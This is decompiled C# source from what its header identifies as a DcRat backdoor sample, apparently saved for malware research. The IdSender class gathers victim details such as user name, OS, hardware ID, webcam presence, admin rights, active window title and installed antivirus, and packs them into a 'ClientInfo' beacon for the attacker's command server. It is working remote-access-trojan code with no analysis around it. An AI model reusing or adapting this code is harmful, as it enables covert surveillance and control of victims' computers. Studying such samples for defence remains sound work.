// Decompiled with JetBrains decompiler
// Type: Client.Helper.IdSender
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Client.Helper
{
  public static class IdSender
  {
    public static byte[] SendInfo()
    {
      MsgPack msgPack1 = new MsgPack();
      msgPack1.ForcePathObject("Pac_ket").AsString = "ClientInfo";
      msgPack1.ForcePathObject("HWID").AsString = Settings.Hw_id;
      msgPack1.ForcePathObject("User").AsString = Environment.UserName.ToString();
      msgPack1.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", (string) null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
      msgPack1.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
      msgPack1.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
      msgPack1.ForcePathObject("Version").AsString = Settings.Ver_sion;
      msgPack1.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
      msgPack1.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
      msgPack1.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin;
      msgPack1.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
      MsgPack msgPack2 = msgPack1.ForcePathObject("Install_ed");
      DateTime dateTime = new FileInfo(Application.ExecutablePath).LastWriteTime;
      dateTime = dateTime.ToUniversalTime();
      string str = dateTime.ToString();
      msgPack2.AsString = str;
      msgPack1.ForcePathObject("Po_ng").AsString = "";
      msgPack1.ForcePathObject("Group").AsString = Settings.Group;
      return msgPack1.Encode2Bytes();
    }
  }
}
